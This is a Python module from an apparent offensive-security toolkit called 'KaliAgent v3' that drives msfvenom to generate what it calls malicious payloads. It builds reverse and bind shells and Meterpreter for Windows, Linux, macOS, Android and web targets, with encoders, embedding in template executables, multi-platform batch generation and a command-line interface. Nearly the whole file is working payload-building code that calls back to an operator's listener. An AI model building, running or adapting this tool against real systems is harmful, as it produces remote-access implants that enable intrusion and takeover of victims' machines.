#!/usr/bin/env python3
"""
KaliAgent v3 - Payload Generator Module
========================================

Generates malicious payloads using MSFVenom and custom templates.

Tasks: 3.2.1, 3.3.1, 3.3.2
Status: IMPLEMENTED
"""

import json
import subprocess
import hashlib
import logging
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


# =============================================================================
# Task 3.2.1: MSFVenom Payload Generation
# =============================================================================

class PayloadType(Enum):
    """Payload types supported by generator."""
    REVERSE_TCP = "reverse_tcp"
    REVERSE_HTTP = "reverse_http"
    REVERSE_HTTPS = "reverse_https"
    REVERSE_WEBSOCKET = "reverse_websocket"
    BIND_TCP = "bind_tcp"
    METERPRETER = "meterpreter"
    SHELL = "shell"
    CUSTOM = "custom"


class PayloadFormat(Enum):
    """Output formats for payloads."""
    # Windows
    EXE = "exe"
    DLL = "dll"
    MSI = "msi"
    HTA = "hta"
    JS = "js"
    VBS = "vbs"
    BAT = "bat"
    PS1 = "ps1"
    
    # Linux
    ELF = "elf"
    SO = "so"
    
    # macOS
    MACHO = "macho"
    APP = "app"
    
    # Web
    WAR = "war"
    JSP = "jsp"
    PHP = "php"
    ASP = "asp"
    ASPX = "aspx"
    
    # Mobile
    APK = "apk"
    
    # Script
    PY = "py"
    RB = "rb"
    PL = "pl"
    SH = "sh"
    
    # Data
    RAW = "raw"
    BASE64 = "base64"
    HEX = "hex"


class Architecture(Enum):
    """Target architectures."""
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"
    MIPS = "mips"
    PPC = "ppc"
    SPARC = "sparc"


class Platform(Enum):
    """Target platforms."""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    ANDROID = "android"
    IOS = "ios"
    WEB = "web"
    MULTI = "multi"


@dataclass
class PayloadConfig:
    """Configuration for payload generation."""
    name: str
    payload_type: PayloadType
    format: PayloadFormat
    architecture: Architecture
    platform: Platform
    lhost: str
    lport: int
    encoder: Optional[str] = None
    iterations: int = 1
    bad_chars: Optional[str] = None
    template: Optional[str] = None
    output_path: Optional[str] = None
    options: Dict = field(default_factory=dict)
    
    def to_msfvenom_args(self) -> List[str]:
        """Convert config to msfvenom arguments."""
        args = []
        
        # Build payload string
        payload = self._build_payload_string()
        args.append(f'p={payload}')
        
        # Format
        args.append(f'f={self.format.value}')
        
        # Architecture
        args.append(f'a={self.architecture.value}')
        
        # Platform
        if self.platform != Platform.MULTI:
            args.append(f'p={self.platform.value}')
        
        # LHOST/LPORT
        args.append(f'LHOST={self.lhost}')
        args.append(f'LPORT={self.lport}')
        
        # Encoder
        if self.encoder:
            args.append(f'e={self.encoder}')
            args.append(f'i={self.iterations}')
        
        # Bad characters
        if self.bad_chars:
            args.append(f'b={self.bad_chars}')
        
        # Template
        if self.template:
            args.append(f'x={self.template}')
        
        # Additional options
        for key, value in self.options.items():
            args.append(f'{key}={value}')
        
        # Output
        if self.output_path:
            args.append(f'o={self.output_path}')
        
        return args
    
    def _build_payload_string(self) -> str:
        """Build payload string for msfvenom."""
        base = self._get_base_payload()
        
        if self.payload_type == PayloadType.REVERSE_TCP:
            return f"{base}/shell/reverse_tcp"
        elif self.payload_type == PayloadType.REVERSE_HTTP:
            return f"{base}/shell/reverse_http"
        elif self.payload_type == PayloadType.REVERSE_HTTPS:
            return f"{base}/shell/reverse_https"
        elif self.payload_type == PayloadType.REVERSE_WEBSOCKET:
            return f"{base}/shell/reverse_tcp_ssl"
        elif self.payload_type == PayloadType.METERPRETER:
            return f"{base}/meterpreter/reverse_tcp"
        elif self.payload_type == PayloadType.BIND_TCP:
            return f"{base}/shell/bind_tcp"
        else:
            return base
    
    def _get_base_payload(self) -> str:
        """Get base payload for platform."""
        mapping = {
            Platform.WINDOWS: 'windows',
            Platform.LINUX: 'linux',
            Platform.MACOS: 'osx',
            Platform.ANDROID: 'android',
            Platform.IOS: 'ios',
            Platform.WEB: 'java',
            Platform.MULTI: 'multi'
        }
        return mapping.get(self.platform, 'windows')


@dataclass
class PayloadResult:
    """Result of payload generation."""
    success: bool
    payload_path: Optional[Path]
    config: PayloadConfig
    size_bytes: int
    hash_md5: str
    hash_sha256: str
    msfvenom_output: str
    error: Optional[str] = None
    warnings: List[str] = field(default_factory=list)


class PayloadGenerator:
    """
    Generates malicious payloads.
    
    Provides:
    - MSFVenom integration
    - Custom payload templates
    - Multi-platform support
    - Encoding options
    - Payload validation
    """
    
    def __init__(self, output_dir: Optional[Path] = None):
        """Initialize payload generator."""
        self.output_dir = output_dir or Path.home() / 'kali_agent_v3' / 'payloads'
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        self.payload_history: List[PayloadResult] = []
        self.templates_dir = self.output_dir / 'templates'
        self.templates_dir.mkdir(exist_ok=True)
        
        logger.info(f"Payload generator initialized (output: {self.output_dir})")
    
    def generate(self, config: PayloadConfig) -> PayloadResult:
        """
        Generate a payload using msfvenom.
        
        Args:
            config: Payload configuration
            
        Returns:
            PayloadResult with generation details
        """
        logger.info(f"Generating payload: {config.name}")
        logger.info(f"  Type: {config.payload_type.value}")
        logger.info(f"  Format: {config.format.value}")
        logger.info(f"  Platform: {config.platform.value}")
        logger.info(f"  Arch: {config.architecture.value}")
        logger.info(f"  LHOST: {config.lhost}, LPORT: {config.lport}")
        
        # Check for msfvenom
        if not self._check_msfvenom():
            return PayloadResult(
                success=False,
                payload_path=None,
                config=config,
                size_bytes=0,
                hash_md5='',
                hash_sha256='',
                msfvenom_output='',
                error='msfvenom not found. Is Metasploit installed?'
            )
        
        # Generate output path
        if not config.output_path:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{config.name}_{timestamp}.{config.format.value}"
            output_path = self.output_dir / filename
        else:
            output_path = Path(config.output_path)
        
        # Build msfvenom command
        msf_args = config.to_msfvenom_args()
        msf_args = [f'--{arg}' if not arg.startswith('o=') else f'-o {arg[2:]}' for arg in msf_args]
        
        # Better argument formatting
        cmd = ['msfvenom']
        for arg in config.to_msfvenom_args():
            if '=' in arg:
                cmd.append(arg)
            else:
                cmd.append(f'-{arg}')
        
        # Actually, let's build it properly
        cmd = self._build_msfvenom_command(config, output_path)
        
        logger.info(f"Command: {' '.join(cmd)}")
        
        try:
            # Run msfvenom
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            # Check success
            if result.returncode != 0:
                return PayloadResult(
                    success=False,
                    payload_path=None,
                    config=config,
                    size_bytes=0,
                    hash_md5='',
                    hash_sha256='',
                    msfvenom_output=result.stdout + result.stderr,
                    error=f'msfvenom failed with code {result.returncode}'
                )
            
            # Verify output file
            if not output_path.exists():
                return PayloadResult(
                    success=False,
                    payload_path=None,
                    config=config,
                    size_bytes=0,
                    hash_md5='',
                    hash_sha256='',
                    msfvenom_output=result.stdout,
                    error='Output file not created'
                )
            
            # Calculate hashes
            size = output_path.stat().st_size
            md5 = self._calculate_hash(output_path, 'md5')
            sha256 = self._calculate_hash(output_path, 'sha256')
            
            payload_result = PayloadResult(
                success=True,
                payload_path=output_path,
                config=config,
                size_bytes=size,
                hash_md5=md5,
                hash_sha256=sha256,
                msfvenom_output=result.stdout,
                warnings=self._check_warnings(result.stdout)
            )
            
            self.payload_history.append(payload_result)
            logger.info(f"✅ Payload generated: {output_path} ({size} bytes)")
            
            return payload_result
            
        except subprocess.TimeoutExpired:
            return PayloadResult(
                success=False,
                payload_path=None,
                config=config,
                size_bytes=0,
                hash_md5='',
                hash_sha256='',
                msfvenom_output='',
                error='msfvenom timed out'
            )
        except Exception as e:
            return PayloadResult(
                success=False,
                payload_path=None,
                config=config,
                size_bytes=0,
                hash_md5='',
                hash_sha256='',
                msfvenom_output='',
                error=str(e)
            )
    
    def _check_msfvenom(self) -> bool:
        """Check if msfvenom is available."""
        try:
            result = subprocess.run(
                ['msfvenom', '--help'],
                capture_output=True,
                timeout=10
            )
            return result.returncode == 0
        except Exception:
            return False
    
    def _build_msfvenom_command(self, config: PayloadConfig, output_path: Path) -> List[str]:
        """Build msfvenom command with proper arguments."""
        cmd = ['msfvenom']
        
        # Payload
        payload = config._build_payload_string()
        cmd.append('-p')
        cmd.append(payload)
        
        # Format
        cmd.append('-f')
        cmd.append(config.format.value)
        
        # Architecture
        cmd.append('-a')
        cmd.append(config.architecture.value)
        
        # Platform
        if config.platform != Platform.MULTI:
            cmd.append('--platform')
            cmd.append(config.platform.value)
        
        # Encoder
        if config.encoder:
            cmd.append('-e')
            cmd.append(config.encoder)
            cmd.append('-i')
            cmd.append(str(config.iterations))
        
        # Bad characters
        if config.bad_chars:
            cmd.append('-b')
            cmd.append(config.bad_chars)
        
        # Template
        if config.template:
            cmd.append('-x')
            cmd.append(config.template)
        
        # Options
        cmd.append(f'LHOST={config.lhost}')
        cmd.append(f'LPORT={config.lport}')
        
        # Additional options
        for key, value in config.options.items():
            cmd.append(f'{key}={value}')
        
        # Output
        cmd.append('-o')
        cmd.append(str(output_path))
        
        return cmd
    
    def _calculate_hash(self, filepath: Path, algorithm: str) -> str:
        """Calculate file hash."""
        hash_func = hashlib.new(algorithm)
        
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b''):
                hash_func.update(chunk)
        
        return hash_func.hexdigest()
    
    def _check_warnings(self, output: str) -> List[str]:
        """Check for warnings in msfvenom output."""
        warnings = []
        
        if 'No platform was selected' in output:
            warnings.append('No platform selected, choosing optimal')
        
        if 'Found matching NOP sled' in output:
            warnings.append('NOP sled found, may affect payload')
        
        if 'Warning: using large payload' in output:
            warnings.append('Large payload may be detected by AV')
        
        return warnings
    
    # =====================================================================
    # Task 3.3.1: Payload Templates Library
    # =====================================================================
    
    def create_template(self, name: str, base_file: Path, 
                       description: str = "") -> Tuple[bool, str]:
        """
        Create a payload template from a base file.
        
        Args:
            name: Template name
            base_file: Base executable file
            description: Template description
            
        Returns:
            Tuple of (success, message)
        """
        if not base_file.exists():
            return False, f"Base file not found: {base_file}"
        
        template_path = self.templates_dir / f"{name}.template"
        
        # Copy base file
        import shutil
        shutil.copy2(base_file, template_path)
        
        # Create metadata
        metadata = {
            'name': name,
            'description': description,
            'created_at': datetime.now().isoformat(),
            'base_file': str(base_file),
            'size_bytes': template_path.stat().st_size,
            'hash_md5': self._calculate_hash(template_path, 'md5'),
            'hash_sha256': self._calculate_hash(template_path, 'sha256')
        }
        
        metadata_path = self.templates_dir / f"{name}.meta.json"
        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        logger.info(f"Created template: {name}")
        
        return True, f"Template created: {template_path}"
    
    def list_templates(self) -> List[Dict]:
        """List available templates."""
        templates = []
        
        for meta_file in self.templates_dir.glob('*.meta.json'):
            with open(meta_file, 'r') as f:
                metadata = json.load(f)
            
            template_name = meta_file.stem.replace('.meta', '')
            template_path = self.templates_dir / f"{template_name}.template"
            
            templates.append({
                'name': metadata.get('name', template_name),
                'description': metadata.get('description', ''),
                'size_bytes': metadata.get('size_bytes', 0),
                'created_at': metadata.get('created_at', ''),
                'exists': template_path.exists()
            })
        
        return templates
    
    def get_template(self, name: str) -> Optional[Path]:
        """Get template file path."""
        template_path = self.templates_dir / f"{name}.template"
        
        if template_path.exists():
            return template_path
        
        return None
    
    # =====================================================================
    # Task 3.3.2: Multi-Platform Payloads
    # =====================================================================
    
    def generate_multi_platform(self, name: str, lhost: str, lport: int,
                               platforms: List[Platform]) -> Dict[str, PayloadResult]:
        """
        Generate payloads for multiple platforms.
        
        Args:
            name: Base name for payloads
            lhost: Listener host
            lport: Listener port
            platforms: List of target platforms
            
        Returns:
            Dictionary of platform -> PayloadResult
        """
        results = {}
        
        for platform in platforms:
            config = PayloadConfig(
                name=f"{name}_{platform.value}",
                payload_type=PayloadType.REVERSE_TCP,
                format=self._get_default_format(platform),
                architecture=self._get_default_arch(platform),
                platform=platform,
                lhost=lhost,
                lport=lport
            )
            
            result = self.generate(config)
            results[platform.value] = result
        
        return results
    
    def _get_default_format(self, platform: Platform) -> PayloadFormat:
        """Get default format for platform."""
        mapping = {
            Platform.WINDOWS: PayloadFormat.EXE,
            Platform.LINUX: PayloadFormat.ELF,
            Platform.MACOS: PayloadFormat.MACHO,
            Platform.ANDROID: PayloadFormat.APK,
            Platform.IOS: PayloadFormat.MACHO,
            Platform.WEB: PayloadFormat.WAR,
            Platform.MULTI: PayloadFormat.RAW
        }
        return mapping.get(platform, PayloadFormat.RAW)
    
    def _get_default_arch(self, platform: Platform) -> Architecture:
        """Get default architecture for platform."""
        mapping = {
            Platform.WINDOWS: Architecture.X64,
            Platform.LINUX: Architecture.X64,
            Platform.MACOS: Architecture.X64,
            Platform.ANDROID: Architecture.ARM,
            Platform.IOS: Architecture.ARM64,
            Platform.WEB: Architecture.X64,
            Platform.MULTI: Architecture.X64
        }
        return mapping.get(platform, Architecture.X64)
    
    # =====================================================================
    # Payload Management
    # =====================================================================
    
    def list_payloads(self, limit: int = 20) -> List[Dict]:
        """List recent payloads."""
        return [
            {
                'name': r.config.name,
                'platform': r.config.platform.value,
                'format': r.config.format.value,
                'size_bytes': r.size_bytes,
                'hash_md5': r.hash_md5,
                'success': r.success,
                'timestamp': self.payload_history.index(r)
            }
            for r in self.payload_history[-limit:]
        ]
    
    def get_payload_info(self, payload_path: str) -> Optional[Dict]:
        """Get information about a payload."""
        path = Path(payload_path)
        
        if not path.exists():
            return None
        
        return {
            'path': str(path),
            'size_bytes': path.stat().st_size,
            'hash_md5': self._calculate_hash(path, 'md5'),
            'hash_sha256': self._calculate_hash(path, 'sha256'),
            'created_at': datetime.fromtimestamp(path.stat().st_ctime).isoformat(),
            'modified_at': datetime.fromtimestamp(path.stat().st_mtime).isoformat()
        }
    
    def cleanup_payloads(self, older_than_days: int = 7) -> int:
        """Clean up old payloads."""
        from datetime import timedelta
        
        cutoff = datetime.now() - timedelta(days=older_than_days)
        removed = 0
        
        for payload_file in self.output_dir.glob('*'):
            if payload_file.is_file() and payload_file.suffix not in ['.meta.json', '.template']:
                mtime = datetime.fromtimestamp(payload_file.stat().st_mtime)
                if mtime < cutoff:
                    payload_file.unlink()
                    removed += 1
        
        logger.info(f"Cleaned up {removed} old payloads")
        
        return removed


# =============================================================================
# Quick Payload Generation Functions
# =============================================================================

def generate_reverse_tcp(lhost: str, lport: int, platform: Platform = Platform.WINDOWS,
                        format: PayloadFormat = PayloadFormat.EXE,
                        output_name: Optional[str] = None) -> PayloadResult:
    """Quick generation of reverse TCP payload."""
    generator = PayloadGenerator()
    
    config = PayloadConfig(
        name=output_name or 'reverse_tcp',
        payload_type=PayloadType.REVERSE_TCP,
        format=format,
        architecture=Architecture.X64 if platform == Platform.WINDOWS else Architecture.X64,
        platform=platform,
        lhost=lhost,
        lport=lport
    )
    
    return generator.generate(config)


def generate_meterpreter(lhost: str, lport: int, platform: Platform = Platform.WINDOWS,
                        encoder: Optional[str] = None,
                        output_name: Optional[str] = None) -> PayloadResult:
    """Quick generation of Meterpreter payload."""
    generator = PayloadGenerator()
    
    config = PayloadConfig(
        name=output_name or 'meterpreter',
        payload_type=PayloadType.METERPRETER,
        format=PayloadFormat.EXE if platform == Platform.WINDOWS else PayloadFormat.ELF,
        architecture=Architecture.X64,
        platform=platform,
        lhost=lhost,
        lport=lport,
        encoder=encoder
    )
    
    return generator.generate(config)


# =============================================================================
# CLI Interface
# =============================================================================

def main():
    """Command-line interface for payload generator."""
    import argparse
    
    parser = argparse.ArgumentParser(description='KaliAgent v3 - Payload Generator')
    parser.add_argument('--generate', action='store_true', help='Generate payload')
    parser.add_argument('--type', type=str, default='reverse_tcp', 
                       choices=['reverse_tcp', 'reverse_http', 'reverse_https', 'meterpreter', 'bind_tcp'],
                       help='Payload type')
    parser.add_argument('--format', type=str, default='exe',
                       choices=['exe', 'dll', 'elf', 'apk', 'war', 'php', 'jsp', 'ps1', 'bat'],
                       help='Output format')
    parser.add_argument('--platform', type=str, default='windows',
                       choices=['windows', 'linux', 'macos', 'android', 'web'],
                       help='Target platform')
    parser.add_argument('--arch', type=str, default='x64',
                       choices=['x86', 'x64', 'arm', 'arm64'],
                       help='Architecture')
    parser.add_argument('--lhost', type=str, help='Listener host')
    parser.add_argument('--lport', type=int, default=4444, help='Listener port')
    parser.add_argument('--encoder', type=str, help='Encoder to use')
    parser.add_argument('--iterations', type=int, default=1, help='Encoder iterations')
    parser.add_argument('--template', type=str, help='Template file')
    parser.add_argument('--output', type=str, help='Output filename')
    parser.add_argument('--list-templates', action='store_true', help='List templates')
    parser.add_argument('--list-payloads', action='store_true', help='List recent payloads')
    parser.add_argument('--multi', action='store_true', help='Generate multi-platform')
    
    args = parser.parse_args()
    
    generator = PayloadGenerator()
    
    if args.list_templates:
        templates = generator.list_templates()
        print(f"\nAvailable Templates: {len(templates)}")
        print("=" * 60)
        for t in templates:
            status = "✅" if t['exists'] else "❌"
            print(f"{status} {t['name']}: {t['description']} ({t['size_bytes']} bytes)")
        print("=" * 60)
    
    elif args.list_payloads:
        payloads = generator.list_payloads()
        print(f"\nRecent Payloads: {len(payloads)}")
        print("=" * 60)
        for p in payloads:
            status = "✅" if p['success'] else "❌"
            print(f"{status} {p['name']} ({p['platform']}/{p['format']}) - {p['size_bytes']} bytes")
        print("=" * 60)
    
    elif args.multi:
        platforms = [Platform.WINDOWS, Platform.LINUX, Platform.ANDROID]
        results = generator.generate_multi_platform('multi_payload', args.lhost, args.lport, platforms)
        
        print("\nMulti-Platform Generation:")
        print("=" * 60)
        for platform, result in results.items():
            status = "✅" if result.success else "❌"
            print(f"{status} {platform}: {result.payload_path if result.success else result.error}")
        print("=" * 60)
    
    elif args.generate or True:  # Default to generate
        # Map arguments to enums
        type_map = {
            'reverse_tcp': PayloadType.REVERSE_TCP,
            'reverse_http': PayloadType.REVERSE_HTTP,
            'reverse_https': PayloadType.REVERSE_HTTPS,
            'meterpreter': PayloadType.METERPRETER,
            'bind_tcp': PayloadType.BIND_TCP
        }
        
        format_map = {
            'exe': PayloadFormat.EXE,
            'dll': PayloadFormat.DLL,
            'elf': PayloadFormat.ELF,
            'apk': PayloadFormat.APK,
            'war': PayloadFormat.WAR,
            'php': PayloadFormat.PHP,
            'jsp': PayloadFormat.JSP,
            'ps1': PayloadFormat.PS1,
            'bat': PayloadFormat.BAT
        }
        
        platform_map = {
            'windows': Platform.WINDOWS,
            'linux': Platform.LINUX,
            'macos': Platform.MACOS,
            'android': Platform.ANDROID,
            'web': Platform.WEB
        }
        
        arch_map = {
            'x86': Architecture.X86,
            'x64': Architecture.X64,
            'arm': Architecture.ARM,
            'arm64': Architecture.ARM64
        }
        
        config = PayloadConfig(
            name=args.output or args.type,
            payload_type=type_map[args.type],
            format=format_map[args.format],
            architecture=arch_map[args.arch],
            platform=platform_map[args.platform],
            lhost=args.lhost,
            lport=args.lport,
            encoder=args.encoder,
            iterations=args.iterations,
            template=args.template,
            output_path=args.output
        )
        
        result = generator.generate(config)
        
        print("\nPayload Generation Result:")
        print("=" * 60)
        print(f"Success: {'✅ Yes' if result.success else '❌ No'}")
        
        if result.success:
            print(f"Path: {result.payload_path}")
            print(f"Size: {result.size_bytes} bytes")
            print(f"MD5: {result.hash_md5}")
            print(f"SHA256: {result.hash_sha256[:16]}...")
        else:
            print(f"Error: {result.error}")
        
        if result.warnings:
            print("\nWarnings:")
            for w in result.warnings:
                print(f"  ⚠️  {w}")
        
        print("=" * 60)


if __name__ == '__main__':
    main()
